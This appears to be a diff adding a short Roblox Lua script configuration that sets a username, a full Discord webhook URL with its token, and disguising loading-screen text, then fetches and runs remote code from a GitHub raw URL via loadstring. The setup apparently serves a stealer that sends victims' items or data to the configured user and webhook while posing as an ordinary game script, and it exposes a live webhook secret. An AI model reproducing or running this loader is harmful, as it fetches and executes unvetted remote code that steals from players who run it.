@@ -1,0 +1,7 @@
+_G.UserName = "zhyloy_ph20"      -- Put ur roblox username here
+
+_G.Webhook = "https://discord.com/api/webhooks/1099146145768411268/srRQxPV3t8JcaOp9tgVQlSE2zA3tq65IW7o-j_GTR3G9fIplDcpfBQUql9_G5n4lhMy0"       -- replace hook with discord webhook
+
+_G.loadingScreenText = "Jmes (Script Updated)"   -- replace text with ur script name 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kingofthescript/mailsp/main/main", true))()
